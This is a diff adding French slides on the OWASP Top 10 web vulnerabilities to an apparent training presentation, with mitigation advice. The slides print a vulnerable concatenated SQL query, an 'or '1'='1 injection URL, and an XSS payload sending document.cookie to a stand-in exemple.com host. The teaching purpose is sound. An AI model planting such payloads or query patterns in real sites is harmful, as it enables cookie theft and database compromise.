@@ -384,7 +384,106 @@
 				<section>
 					<h3>L’injection</h3>
 					<code><pre>SELECT * FROM client WHERE id='" . $_GET["id"] . "'</pre></code>
-					<code><pre>http://exemple.com/liste?id='or '1'='1</pre></code>
+					<code class="fragment"><pre>http://exemple.com/liste?id='or '1'='1</pre></code>
+				</section>
+
+				<section>
+					<h3>Violation de gestion d'authentification et de session</h3>
+					<code><pre>http://exemple.com/?jsessionid=A2938298D293</pre></code>
+				</section>
+
+				<section>
+					<h3>XSS</h3>
+					<p>Éxecution de code Javascript sans validation</p>
+					<code><pre>Votre Nom : <input type="text" name="nom" value="" /></pre></code>
+					<code class="fragment"><pre><script>alert("'echo $_POST["nom"];'");</script></pre></code>
+					<code class="fragment"><pre><script>window.location = 'https://www.exemple.com? cookie=' + document.cookie</script></pre></code>
+				</section>
+
+				<section>
+					<h3>Référence directes non sécurisées à un objet</h3>
+					<code><pre>http://exemple.com/liste?mode=client</pre></code>
+					<div class="fragment">
+						<p>Si je change client par … admin ?</p>
+						<code><pre>SELECT * FROM client where mode=?</pre></code>
+						<code><pre>$stmt->bindParam(1, $mode);</pre></code>
+					</div>
+				</section>
+
+				<section>
+					<h3>Mauvaise configuration sécurisé</h3>
+					<ul>
+						<li>Console d’administration disponible sans authentification en ligne</li>
+						<li>Listage des repertoires (<a href="https://www.google.fr/search?dcr=0&q=-inurl%3A%28htm%7Chtml%7Cphp%29+intitle%3A"index+of"+%2B"last+modified"+%2B"parent+directory"+%2Bdescription+%2Bsize&oq=-inurl%3A%28htm%7Chtml%7Cphp%29+intitle%3A"index+of"+%2B"last+modified"+%2B"parent+directory"+%2Bdescription+%2Bsize">Exemple</a>)</li>
+						<li>Exemples de code non supprimés</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>Exposition de données sensibles</h3>
+					<ul>
+						<li>Espace client sans SSL</li>
+						<li>Mot de passe en claire (ou en MD5) dans la base de données</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>Manque de contrôle d'accès au niveau fonctionnel</h3>
+					<ul>
+						<li>Page d’admin accessible avec un compte utilisateur</li>
+						<li>Mode non filtré (similaire à l’exemple mode={client,admin})</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>CSRF: Falsification des requêtes</h3>
+					<ul>
+						<li>Rejeu de requête déjà joué</li>
+					</ul>
+
+					<h4>Comment le bloquer ?</h4>
+					<p>Ajouter un identifiant/jeton dans la requête, unique et non réutilisable</p>
+				</section>
+
+				<section>
+					<h3>Utilisation de composants avec des vulnérabilités connues</h3>
+					<ul>
+						<li>CMS non à jour</li>
+						<li>Apache / Tomcat non paché</li>
+						<li>Librairies XYZ non à jour</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>Redirection et renvois non validés</h3>
+					<ul>
+						<li>Utilisation de votre site comme « masque » dans du phishing</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>Comment réduire le risque ?</h3>
+					<ul>
+						<li>Sensibilisations - Formations</li>
+						<li>Revue de code</li>
+						<li>Tests d’intrusions</li>
+						<li>Sécurité lors du recrutement</li>
+						<li>Sucurité des la conception du projet</li>
+						<li>Suivi des bonnes pratique (ex OWASP)</li>
+					</ul>
+				</section>
+
+
+				<section>
+					<h3>Pourquoi il faut se battre (en interne) ?</h3>
+					<ul class="fragement">
+						<li>Résistance au changement</li>
+						<li>ERP / CMS</li>
+						<li>La sécurité est vu comme un frein, pas une fonctionnalitée</li>
+						<li>Déni de la réalité</li>
+						<li>Multitude de librairies</li>
+						<li>Developpement externe (presta, stagiaires, …)</li>
+					</ul>
 				</section>
 
 			</div>
